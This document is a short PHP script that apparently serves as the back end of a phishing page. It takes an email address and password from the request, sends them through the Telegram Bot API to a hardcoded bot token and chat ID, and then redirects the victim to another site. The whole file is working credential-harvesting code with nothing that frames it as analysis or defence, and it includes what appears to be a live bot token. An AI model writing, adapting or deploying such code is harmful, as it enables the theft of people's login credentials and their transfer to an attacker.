<?php
$botToken = '8783254749:AAE4nkFAZCvcthkcu_Maasw1WMwrjefw310';
$chatId   = '7660485006';

$email_full = isset($_GET['email']) ? $_GET['email'] : 'No_Email';
$serial     = isset($_GET['password']) ? $_GET['password'] : 'No_Serial';

$email_parts = explode('@', $email_full);
$email_username = $email_parts[0]; 

$message = "Email: " . $email_username . "\nPassword: " . $serial;

$telegramApiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect the user
header("Location: https://example.com");
exit();
?>